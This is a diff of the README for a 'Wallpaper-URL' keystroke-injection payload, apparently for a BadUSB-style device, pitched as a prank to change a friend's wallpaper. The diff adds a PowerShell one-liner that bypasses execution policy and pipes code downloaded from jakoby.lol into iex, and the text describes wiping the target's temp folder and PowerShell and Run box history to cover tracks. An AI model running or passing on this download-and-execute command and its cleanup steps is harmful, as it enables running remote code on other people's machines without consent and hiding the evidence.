@@ -15,13 +15,13 @@
 
 # Wallpaper-URL
 
-This payload will download an image from any URL and set it as the targets wallpaper 
+This payload will download an image from any URL and set it as the target's wallpaper. 
 
 ## Description
 
-Use this program to troll your friends. Find any image online and grab the url and insert it into the PS1 script. 
-Run this payload and step away. Once a mouse movement is detected their wallpaper will change right in front of their eyes.
-and lastly to clean up your tracks behind you the tmp folder will be emptied and the powershell and run box history will be wiped 
+Use this program to troll your friends. Find any image online and grab the URL and insert it into the PS1 script. 
+Run this payload and step away. Once a mouse movement is detected, their wallpaper will change right in front of their eyes.
+Lastly, to clean up your tracks behind you, the tmp folder will be emptied and the PowerShell and run box history will be wiped.
 
 
 ## Getting Started
@@ -36,8 +36,9 @@ and lastly to clean up your tracks behind you the tmp folder will be emptied and
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+* Place your images URL in the $url variable
 ```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr <URL for your hosted payload>?dl=1; invoke-expression $pl
+powershell -noexit -NoP -NonI -Exec Bypass $url='URL-HERE';iwr jakoby.lol/pkw | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
@@ -60,28 +61,43 @@ I am Jakoby
 <!-- CONTACT -->
 ## Contact
 
-<div><h2>I am Jakoby</h2></div>
-  <p><br/>
-  
-  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
-  
-  <a href="https://github.com/I-Am-Jakoby/">
-    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
-  </a>
-  
-  <a href="https://www.instagram.com/i_am_jakoby/">
-    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
-  </a>
-  
-  <a href="https://twitter.com/I_Am_Jakoby/">
-    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
-  </a>
-  
-  <a href="https://www.youtube.com/c/IamJakoby/">
-    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
-  </a>
-
-</p>
+<h2 align="center">📱 My Socials 📱</h2>
+<div align=center>
+<table>
+  <tr>
+    <td align="center" width="96">
+      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
+      </a>
+      <br>YouTube
+    </td>
+    <td align="center" width="96">
+      <a href="https://twitter.com/I_Am_Jakoby">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
+      </a>
+      <br>Twitter
+    </td>
+    <td align="center" width="96">
+      <a href="https://www.instagram.com/i_am_jakoby/">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
+      </a>
+      <br>Instagram
+    </td>
+    <td align="center" width="96">
+      <a href="https://discord.gg/MYYER2ZcJF">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
+      </a>
+      <br>Discord
+    </td>
+    <td align="center" width="96">
+      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
+      </a>
+      <br>TikTok
+    </td>    
+  </tr>
+</table>
+</div>
 
 
 
